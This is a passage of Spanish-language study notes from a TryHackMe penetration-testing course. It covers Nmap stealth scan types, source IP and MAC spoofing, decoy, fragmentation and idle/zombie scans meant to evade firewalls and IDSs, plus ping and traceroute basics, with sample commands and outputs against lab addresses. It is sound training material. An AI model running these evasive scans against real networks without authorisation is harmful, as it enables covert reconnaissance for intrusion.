    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "Esta unidad es la tercera de una lista de 4 unidades dedicadas a Nmap.\n\n1. [[0. Nmap Live Host Discovery]]\n2. [[0. Nmap Basic Port Scans]]\n3. [[0. Nmap Advanced Port Scans]]\n4. [[0. Nmap Post Port Scans]]\n\nEn la unidad anterior vimos las flags TCP y el 3-way handshake. Para iniciar una conexi√≥n, TCP necesita que el primer paquete tenga la flag SYN configurada. Pero ¬øqu√© pasa si se manda como primera comunicaci√≥n un paquete TCP con la flag ACK configurada? Es como si alguien de la nada te dijera: \"S√≠, continua hablando, te escucho\". Pero t√∫ no has dicho nada.\n\nEn esta unidad veremos tipos avanzados de escaneo:\n\n- Null Scan\n- FIN Scan\n- Xmas Scan\n- Maimon Scan\n- ACK Scan\n- Window Scan\n- Custom Scan\n\nAdem√°s, veremos esto tambi√©n:\n\n- Spoofing IP\n- Spoofing MAC\n- Decoy Scan\n- Fragmented Packets\n- Idle/Zombie Scan\n\nVeremos opciones y t√©cnicas para evadir FireWalls e IDSs",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/9-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/9. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "En esta unidad hemos visto los siguientes escaneos:\n\n| Tipo de Escaneo de Puertos     | Comando de Ejemplo                                       |\n| ------------------------------ | -------------------------------------------------------- |\n| TCP Null Scan                  | `sudo nmap -sN 10.82.139.236`                            |\n| TCP FIN Scan                   | `sudo nmap -sF 10.82.139.236`                            |\n| TCP Xmas Scan                  | `sudo nmap -sX 10.82.139.236`                            |\n| TCP Maimon Scan                | `sudo nmap -sM 10.82.139.236`                            |\n| TCP ACK Scan                   | `sudo nmap -sA 10.82.139.236`                            |\n| TCP Window Scan                | `sudo nmap -sW 10.82.139.236`                            |\n| Custom TCP Scan                | `sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.82.139.236` |\n| Spoofed Source IP              | `sudo nmap -S SPOOFED_IP 10.82.139.236`                  |\n| Spoofed MAC Address            | `--spoof-mac SPOOFED_MAC`                                |\n| Decoy Scan                     | `nmap -D DECOY_IP,ME 10.82.139.236`                      |\n| Idle (Zombie) Scan             | `sudo nmap -sI ZOMBIE_IP 10.82.139.236`                  |\n| Fragment IP data into 8 bytes  | `-f`                                                     |\n| Fragment IP data into 16 bytes | `-ff`                                                    |\n\nAdem√°s hemos visto las siguientes opciones:\n\n| Option                   | Purpose                                                       |\n| ------------------------ | ------------------------------------------------------------- |\n| `--source-port PORT_NUM` | Especificar el puerto de origen                               |\n| `--data-length NUM`      | A√±adir ciertos bytes aleatorios para alcanzar cierta longitud |\n| `--reason`               | Explica c√≥mo Nmap lleg√≥ a esa conclusi√≥n                      |\n| `-v`                     | Verbose                                                       |\n| `-vv`                    | M√°s verbose                                                   |\n| `-d`                     | Depuraci√≥n                                                    |\n| `-dd`                    | Mas detalles de depuraci√≥n                                    |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. TCP Null Scan, FIN Scan, and Xmas Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/2-tcp-null-scan-fin-scan-and-xmas-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/2. TCP Null Scan, FIN Scan, and Xmas Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "Empecemos con los siguientes tipos de escaneo:\n\n- Null Scan\n- FIN Scan\n- Xmas Scan\n\n---------------------------------------\n<h2>Null Scan</h2>\nEl escaneo Null no configura ninguna flag. Todos los bits est√°n en \"0\". Puedes elegir este tipo de escaneo con la opci√≥n `-sN`. Un paquete TCP sin flags no disparar√° una respuesta cuando alcance un puerto abierto. Por lo que si Nmap no recibe una respuesta determinar√° que est√° abierto o que hay un firewall bloqueando el tr√°fico.\n\n![[Pasted image 20251120120648.png]]\n\nSin embargo, si est√° cerrado s√≠ que recibiremos un paquete ACK/RST indicando que est√° cerrado.\n\n![[Pasted image 20251120120718.png]]\n\nDebajo un ejemplo de un escaneo y la respuesta.\n\n```shell\npentester@TryHackMe$ sudo nmap -sN 10.82.144.170\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:30 BST\nNmap scan report for 10.82.144.170\nHost is up (0.00066s latency).\nNot shown: 994 closed ports\nPORT    STATE         SERVICE\n22/tcp  open|filtered ssh\n25/tcp  open|filtered smtp\n80/tcp  open|filtered http\n110/tcp open|filtered pop3\n111/tcp open|filtered rpcbind\n143/tcp open|filtered imap\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 96.50 seconds\n```\n\n---------------------------------\n<h2>FIN Scan</h2>\nEl escaneo FIN manda un paquete TCP con la flag FIN configurada. Puedes elegir este tipo de escaneo con la opci√≥n ¬¥-sF¬¥. No se mandar√° respuesta si el puerto est√° abierto, aunque tambi√©n podr√≠a ser un firewall bloqueando el puerto.\n\n![[Pasted image 20251120121750.png]]\n\nSin embargo, el sistema responder√° con RST si el puerto est√° cerrado. Aunque algunos firewalls pueden tirar la conexi√≥n silenciosamente sin mandar RST, estando el puerto abierto.\n\n![[Pasted image 20251120121907.png]]\n\nDebajo un ejemplo de escaneo y respuesta.\n\n```shell\npentester@TryHackMe$ sudo nmap -sF 10.82.144.170\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:32 BST\nNmap scan report for 10.82.144.170\nHost is up (0.0018s latency).\nNot shown: 994 closed ports\nPORT    STATE         SERVICE\n22/tcp  open|filtered ssh\n25/tcp  open|filtered smtp\n80/tcp  open|filtered http\n110/tcp open|filtered pop3\n111/tcp open|filtered rpcbind\n143/tcp open|filtered imap\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 96.52 seconds\n```\n\n-------------------------------\n<h2>Xmas Scan</h2>\nEl escaneo Xmas toman su nombre de las luces del arbol de navidad. Un escaneo Xmas configura las flags FIN, PSH y URG de manera simult√°nea. Puedes seleccionar este escaneo con la opci√≥n `-sX`.\n\nComo la flag FIN est√° configurado pasa exactamente lo mismo que con los otros escaneos:\n\n![[Pasted image 20251120122500.png]]\n![[Pasted image 20251120122504.png]]\n\nDebajo un ejemplo del escaneo y la respuesta.\n\n```shell\npentester@TryHackMe$ sudo nmap -sX 10.82.144.170\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:34 BST\nNmap scan report for 10.82.144.170\nHost is up (0.00087s latency).\nNot shown: 994 closed ports\nPORT    STATE         SERVICE\n22/tcp  open|filtered ssh\n25/tcp  open|filtered smtp\n80/tcp  open|filtered http\n110/tcp open|filtered pop3\n111/tcp open|filtered rpcbind\n143/tcp open|filtered imap\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 84.85 seconds\n```\n\nUn escenario donde estos tres tipos de escaneos pueden resultar √∫tiles o eficientes es al escanear un oobjetico detr√°s de un firewall stateless. Este comprobar√° si el paquete entrante tiene la flag SYN para detectar un intento de conexi√≥n. Usar una combinaci√≥n de flags que no coincida con la flag SYN hace posible enga√±ar al firewall y alcanzar el sistema que hay detr√°s. Sin embargo, un firewall stateful bloquear√° pr√°cticamente todos los paquetes crafteados.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. TCP Mainmon Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/3-tcp-mainmon-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/3. TCP Mainmon Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "Uriel Maimon fue el primero en describir este escaneo en 1996. En este escaneo, se configuran las flags FIN y ACK. El objetivo mandar√° un paquete RST como respuesta. Sin embargo, ciertos sistemas derivados de BSD (Berkley Software Distribution), dropean este paquete si el puerto est√° abierto. Para seleccionar este tipo de ataque usa la opci√≥n `-sM`.\n\nLa mayor√≠a de los sistemas responder√°n con un paquete RST.\n\n![[Pasted image 20251120125710.png]]\n\nEl output de la consola ser√° as√≠:\n\n```shell\npentester@TryHackMe$ sudo nmap -sM 10.10.252.27\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:36 BST\nNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)\nHost is up (0.00095s latency).\nAll 1000 scanned ports on ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27) are closed\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.61 seconds\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Fragmented Packets",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/6-fragmented-packets/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/6. Fragmented Packets.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "<h2>Firewall</h2>\nUn firewall es una pieza de software o hardware que permite a los paquetes pasar o no. Funciona basado en reglas, o bien permite todo el tr√°fico con excepciones o bien lo bloquea todo con excepciones.\n\n-----------------------------------\n<h2>IDS</h2>\nIntrusion Detection System (IDS) inspecciona los paquetes de red en busca de patrones de comportamiento o firmas espec√≠ficas en su contenido. Lanza una alerta si alguna regla coincide. Un IDS puede inspeccionar la informaci√≥n de los paquetes. Para poder sobreasar algunos filtros de firewalls/IDSs respecto a Nmap una soluci√≥n es hacer los paquetes m√°s peque√±os.\n\n-----------------------------\n<h2>Fragmented Packets</h2>\nNmap ofrece la opci√≥n `-f` para fragmentar paquetes. Una vez elegida, la informaci√≥n IP se dividir√° en 8 bytes o menos. A√±adir otra f (`-ff` o `-f -f`), har√° que la informaci√≥n se divida en 16 bytes. Puedes cambiar el valor por defecto usando la opci√≥n `--mtu`. Sin embargo, deber√≠as siempre escoger un m√∫ltiplo de 8.\n\nPara entender esto debemos recordar c√≥mo se ve un paquete IP:\n\n![[Pasted image 20251120160303.png]]\n\nVamos a comparar primero sin fragmentar y luego fragmentado.\n\n![[Pasted image 20251120160425.png]]\n\nEn esta imagen podemos ver primero una solicitud ARP y luego los paquetes TCP/IP. Mientras que con la fragmentaci√≥n se ve de la siguiente manera:\n\n![[Pasted image 20251120160548.png]]\n\nSi quieres incrementar el tama√±o del paquete puedes hacerlo con `--data-length NUM` donde el n√∫mero es la cantidad de bytes que quieres a√±adir al paquete.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Nmap Advanced Port Scans",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/0-nmap-advanced-port-scans/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/0. Nmap Advanced Port Scans.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/1. Introduction]]\n[[2. TCP Null Scan, FIN Scan, and Xmas Scan]]\n[[3. TCP Mainmon Scan]]\n[[4. TCP ACK, Window, and Custom Scan]]\n[[5. Spoofing and Decoys]]\n[[6. Fragmented Packets]]\n[[7. Idle-Zombie Scan]]\n[[8. Getting More Details]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/9. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Idle-Zombie Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/7-idle-zombie-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/7. Idle-Zombie Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "Suplantar la direcci√≥n IP de origen puede ser una buena manera de implementar sigilo al escanear. Sin embargo, suplantar s√≥lo funcionar√° en configuraciones de red espec√≠ficas. Requiere que est√©s en una posici√≥n en donde puedas monitorizar el tr√°fico. Sin embargo, podemos mejorar este m√©todo con el escaneo idle.\n\nEl escaneo idle (ausente), o zombie, requiere que haya un sistema conectado a la red con el que te puedas comunicar. B√°sicamente, Nmap har√° que parezca que el escaneo viene del host ausente. Luego, comprobar√° indicadores de si el host idle recibi√≥ alguna respuesta. Esto se consigue comprobando la identificaci√≥n IP (IP ID) del IP header. Puedes ejecutar este escaneo usando `nmap -sI ZOMBIE_IP TARGET_IP`.\n\nPrimero escaneamos un idle host (como una impresora). Al mandar un SYN/ACK responde con un RST que contiene su nuevo IP ID. \n\n![[Pasted image 20251120161459.png]]\n\nLuego se manda un TCP SYN a la m√°quina objetivo por un puerto TCP. Pero este paquete usara la direcci√≥n de la m√°quina ausente como direcci√≥n IP de origen. En la primera imagen de debajo es lo que pasa si el puerto est√° cerrado y en la segunda si este mismo est√° abierto.\n\n![[Pasted image 20251120161859.png]]\n![[Pasted image 20251120161904.png]]\n\nEn el tercer caso (sin imagen), la m√°quina no responde debido a reglas de firewall.\n\nEn cualquier caso, como paso final se debe mandar otro paquete SYN/ACK a la m√°quina ausente para que te devuelva otro IP ID. Necesitas compararlos. Si la diferencia es 1, significa que el puerto estaba cerrado o filtrado. Si la diferencia fue de 2, significa que el puerto estaba abierto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Getting More Details",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/8-getting-more-details/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/8. Getting More Details.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "Puedes considerar a√±adir la opci√≥n `--reason` si quieres que Nmap ofrezca m√°s detalles sobre su razonamiento y conclusiones. Considera los dos escaneos de debajo, uno sin la opci√≥n y otro con ella.\n\n```shell\npentester@TryHackMe$ sudo nmap -sS 10.10.252.27\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:39 BST\nNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)\nHost is up (0.0020s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n110/tcp open  pop3\n111/tcp open  rpcbind\n143/tcp open  imap\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.60 seconds\n```\n\n```shell\npentester@TryHackMe$ sudo nmap -sS --reason 10.10.252.27\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:40 BST\nNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)\nHost is up, received arp-response (0.0020s latency).\nNot shown: 994 closed ports\nReason: 994 resets\nPORT    STATE SERVICE REASON\n22/tcp  open  ssh     syn-ack ttl 64\n25/tcp  open  smtp    syn-ack ttl 64\n80/tcp  open  http    syn-ack ttl 64\n110/tcp open  pop3    syn-ack ttl 64\n111/tcp open  rpcbind syn-ack ttl 64\n143/tcp open  imap    syn-ack ttl 64\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.59 seconds\n```\n\nSabemos entonces que el host est√° activo porque Nmap recibi√≥ una respuesta ARP y adem√°s sabemos que el puerto SSH est√° abierto porque Nmap recibi√≥ un paquete syn-ack.\n\nSi queremos ver todav√≠a m√°s detalles podemos a√±adir `-v` o `-vv` para m√°s verbose.\n\n```shell\npentester@TryHackMe$ sudo nmap -sS -vv 10.10.252.27\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:41 BST\nInitiating ARP Ping Scan at 10:41\nScanning 10.10.252.27 [1 port]\nCompleted ARP Ping Scan at 10:41, 0.22s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 10:41\nCompleted Parallel DNS resolution of 1 host. at 10:41, 0.00s elapsed\nInitiating SYN Stealth Scan at 10:41\nScanning ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27) [1000 ports]\nDiscovered open port 22/tcp on 10.10.252.27\nDiscovered open port 25/tcp on 10.10.252.27\nDiscovered open port 80/tcp on 10.10.252.27\nDiscovered open port 110/tcp on 10.10.252.27\nDiscovered open port 111/tcp on 10.10.252.27\nDiscovered open port 143/tcp on 10.10.252.27\nCompleted SYN Stealth Scan at 10:41, 1.25s elapsed (1000 total ports)\nNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)\nHost is up, received arp-response (0.0019s latency).\nScanned at 2021-08-30 10:41:02 BST for 1s\nNot shown: 994 closed ports\nReason: 994 resets\nPORT    STATE SERVICE REASON\n22/tcp  open  ssh     syn-ack ttl 64\n25/tcp  open  smtp    syn-ack ttl 64\n80/tcp  open  http    syn-ack ttl 64\n110/tcp open  pop3    syn-ack ttl 64\n111/tcp open  rpcbind syn-ack ttl 64\n143/tcp open  imap    syn-ack ttl 64\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 1.59 seconds\n           Raw packets sent: 1002 (44.072KB) | Rcvd: 1002 (40.092KB)\n```\n\nSi `-vv` no satisface tu curiosidad puedes usar `-d` o `-dd` para los detalles de depuraci√≥n (debugging).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "En la primera unidad de este m√≥dulo nos centramos en el reconocimiento pasivo. En esta segunda unidad vamos a enfocarnos en el reconocimiento activo y las herramientas esenciales relacionadas con √©l. \n\nAprenderemos a c√≥mo usar el navegador para obtener informaci√≥n sobre nuestro objetivo y veremos herramientas como `ping`, `traceroute`, `telnet` y `nc`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Web Browser",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/2-web-browser/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/2. Web Browser.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "El navegador puede ser una herramienta conveniente. Hay m√∫ltiples maneras en las que podemos usar el navegador web para recopilar informaci√≥n sobre el objetivo.\n\nA nivel de transporte, el navegador se conecta a:\n\n- Puerto 80 TCP por defecto cuando el sitio web es accedido por HTTP.\n- Puerto 443 TCP por defecto cuando el sitio web es accedido por HtTPS.\n\nYa que los puertos 80 y 443 son por defecto, el navegador no los muestra en la barra de direcciones. Sin embargo, es posible usar puertos personalizados para acceder a servicios.\n\nMientras que navegamos una p√°gina web, podemos presionar `Ctrl+Shift+I` para abrir las herramientas de desarrollador.\n\nTambi√©n hay muchos add-ons para Firefox y Chrome que pueden ayudar en el pentest. Aqu√≠ algunos ejemplos:\n\n- **FoxyProxy:** Te permite cambiar el servidr proxy que est√°s usando para acceder al sitio web. Es conveniente al usar Burp Suite, por ejemplo. Desc√°rgalo [aqu√≠](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard).\n- **User-Agent Switcher and Manager:** Te da la habilidad de pretender estar accediendo a la p√°gina web desde diferentes sistemas operativos o navegadores web. Te lo puedes descargar [aqu√≠](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher).\n- **Wappalyzer:** Ofrece una vista interna sobre las tecnolog√≠as usadas en los sitios web visitados. Es √∫til para recolectar informaci√≥n mientras navegas. Desc√°rgatela [aqu√≠](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Ping",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/3-ping/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/3. Ping.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "Ping deber√≠a recordarte al ping-pong. Lanzas la pelota y esperas que te la devuelvan. El prop√≥sito principal de `ping` es comprobar si puedes alcanzar un sistema remoto.\n\nEl comando ping manda un paquete a un sistema remoto y este le contesta. Si prefieres una definici√≥n m√°s t√©cnica, `ping` manda un paquete ICMP Echo al sistema remoto, si este est√° online, y el paquete fue correctamente enrutado y no bloqueado por el firewall, responder√° mandando un ICMP Echo Reply.\n\nPing recae bajo el protocolo ICMP (Internet Control Message Protocol). ICMP soporta varios tipos de petici√≥n, pero en particular, estamos interesados en ping (ICMP echo / type 8) y ping reply (ICMP echo reply / type 0).\n\n```shell\nuser@AttackBox$ ping -c 5 10.10.71.27 \nPING 10.10.71.27 (10.10.71.27) 56(84) bytes of data. \n64 bytes from 10.10.71.27: icmp_seq=1 ttl=64 time=0.636 ms \n64 bytes from 10.10.71.27: icmp_seq=2 ttl=64 time=0.483 ms \n64 bytes from 10.10.71.27: icmp_seq=3 ttl=64 time=0.396 ms \n64 bytes from 10.10.71.27: icmp_seq=4 ttl=64 time=0.416 ms \n64 bytes from 10.10.71.27: icmp_seq=5 ttl=64 time=0.445 ms  \n--- 10.10.71.27 ping statistics --- \n5 packets transmitted, 5 received, 0% packet loss, time 4097ms \nrtt min/avg/max/mdev = 0.396/0.475/0.636/0.086 ms\n```\n\nEste es el resultado de hacer un ping a una m√°quina online. Mientras que abajo tenemos lo que ocurre al pinguear un sistema offline:\n\n```shell\nuser@AttackBox$ ping -c 5 10.10.71.27 \nPING 10.10.71.27 (10.10.71.27) 56(84) bytes of data. \nFrom ATTACKBOX_IP icmp_seq=1 Destination Host Unreachable \nFrom ATTACKBOX_IP icmp_seq=2 Destination Host Unreachable \nFrom ATTACKBOX_IP icmp_seq=3 Destination Host Unreachable \nFrom ATTACKBOX_IP icmp_seq=4 Destination Host Unreachable \nFrom ATTACKBOX_IP icmp_seq=5 Destination Host Unreachable  \n--- 10.10.71.27 ping statistics --- \n5 packets transmitted, 0 received, +5 errors, 100% packet loss, time 4098ms pipe 4\n```\n\nCuando no recibimos ning√∫n tipo de respuesta puede tener varias explicaciones:\n\n- El ordenador de destino no responde (todav√≠a reiniciando, apagado, o crasheado).\n- Est√° desconectado de la red.\n- Hay un firewall configurado para bloquear dichos paquetes.\n- Tu sistema est√° desconectado de la red.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Traceroute",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/4-traceroute/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/4. Traceroute.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "Como sugiere el nombre, el comando traceroute rastrea la ruta tomada por los paquetes desde tu sistema al otro host. El prop√≥sito de traceroute es encontrar las direcci√≥nes IP de los routers o saltos que el paquete atraviesa mientras se mueve por la red de un host a otro. Este comando tambi√©n revela el n√∫mero de routers que hay entre los dos dispositivos. Sin embargo es importante saber que la ruta puede cambiar ya que la mayor√≠a de estos routers se configuran con enrutamiento din√°mico.\n\n>[!TIP] En Linux el comando es `traceroute <IP>` y en MS `tracert <IP>`.\n\nNo hay una manera directa de descubrir la ruta desde tu sistema al sistema objetivo, sino que necesitamos \"enga√±ar\" a los routers mediante ICMP para que revelen su IP. Podemos conseguir esto usando un TTL bajo en el header IP. El TTL (Time To Live) es un n√∫mero que define la cantidad m√°xima de saltos entre dispositivos, cuando llega a 0 se descarta el mensaje. \n\n![[Pasted image 20251117173937.png]]\n\n\nCuando llega a 0 se descarta y se manda un mensaje de \"Time-to-live exceeded\" al sistema que lanz√≥ la petici√≥n. De esta manera, poniento un TTL = 1, podemos forzar recibir un TTL exceeded desde el primer router, lo que nos puede revelar su IP, y as√≠ sucesivamente.\n\n![[Pasted image 20251117174248.png]]\n\nEn Linux, `traceroute` comenzar√° mandando datagramas UDP en los paquetes IP del TTL = 1. Esto causa que el router se encuentre con un TTL = 0 y devuelve el time exceeded. Luego hace lo mismo pero con TTL = 2, y as√≠ sucesivamente.\n\n```shell\nuser@AttackBox$ traceroute tryhackme.com \ntraceroute to tryhackme.com (172.67.69.208), 30 hops max, 60 byte packets  \n1  ec2-3-248-240-5.eu-west-1.compute.amazonaws.com (3.248.240.5)  2.663 ms * ec2-3-248-240-13.eu-west-1.compute.amazonaws.com (3.248.240.13)  7.468 ms  \n2  100.66.8.86 (100.66.8.86)  43.231 ms 100.65.21.64 (100.65.21.64)  18.886 ms 100.65.22.160 (100.65.22.160)  14.556 ms  \n3  * 100.66.16.176 (100.66.16.176)  8.006 ms *  \n4  100.66.11.34 (100.66.11.34)  17.401 ms 100.66.10.14 (100.66.10.14)  23.614 ms 100.66.19.236 (100.66.19.236)  17.524 ms  \n5  100.66.7.35 (100.66.7.35)  12.808 ms 100.66.6.109 (100.66.6.109)  14.791 ms * \n6  100.65.14.131 (100.65.14.131)  1.026 ms 100.66.5.189 (100.66.5.189)  19.246 ms 100.66.5.243 (100.66.5.243)  19.805 ms  \n7  100.65.13.143 (100.65.13.143)  14.254 ms 100.95.18.131 (100.95.18.131)  0.944 ms 100.95.18.129 (100.95.18.129)  0.778 ms  \n8  100.95.2.143 (100.95.2.143)  0.680 ms 100.100.4.46 (100.100.4.46)  1.392 ms 100.95.18.143 (100.95.18.143)  0.878 ms  \n9  100.100.20.76 (100.100.20.76)  7.819 ms 100.92.11.36 (100.92.11.36)  18.669 ms 100.100.20.26 (100.100.20.26)  0.842 ms \n10  100.92.11.112 (100.92.11.112)  17.852 ms * 100.92.11.158 (100.92.11.158)  16.687 ms \n11  100.92.211.82 (100.92.211.82)  19.713 ms 100.92.0.126 (100.92.0.126)  18.603 ms 52.93.112.182 (52.93.112.182)  17.738 ms \n12  99.83.69.207 (99.83.69.207)  17.603 ms  15.827 ms  17.351 ms \n13  100.92.9.83 (100.92.9.83)  17.894 ms 100.92.79.136 (100.92.79.136)  21.250 ms 100.92.9.118 (100.92.9.118)  18.166 ms \n14  172.67.69.208 (172.67.69.208)  17.976 ms  16.945 ms 100.92.9.3 (100.92.9.3)  17.709 ms\n```\n\n```shell\nuser@AttackBox$ traceroute tryhackme.com \ntraceroute to tryhackme.com (104.26.11.229), 30 hops max, 60 byte packets  \n1  ec2-79-125-1-9.eu-west-1.compute.amazonaws.com (79.125.1.9)  1.475 ms * ec2-3-248-240-31.eu-west-1.compute.amazonaws.com (3.248.240.31)  9.456 ms  \n2  100.65.20.160 (100.65.20.160)  16.575 ms 100.66.8.226 (100.66.8.226)  23.241 ms 100.65.23.192 (100.65.23.192)  22.267 ms  \n3  100.66.16.50 (100.66.16.50)  2.777 ms 100.66.11.34 (100.66.11.34)  22.288 ms 100.66.16.28 (100.66.16.28)  4.421 ms  \n4  100.66.6.47 (100.66.6.47)  17.264 ms 100.66.7.161 (100.66.7.161)  39.562 ms 100.66.10.198 (100.66.10.198)  15.958 ms  \n5  100.66.5.123 (100.66.5.123)  20.099 ms 100.66.7.239 (100.66.7.239)  19.253 ms 100.66.5.59 (100.66.5.59)  15.397 ms  \n6  * 100.66.5.223 (100.66.5.223)  16.172 ms 100.65.15.135 (100.65.15.135)  0.424 ms  \n7  100.65.12.135 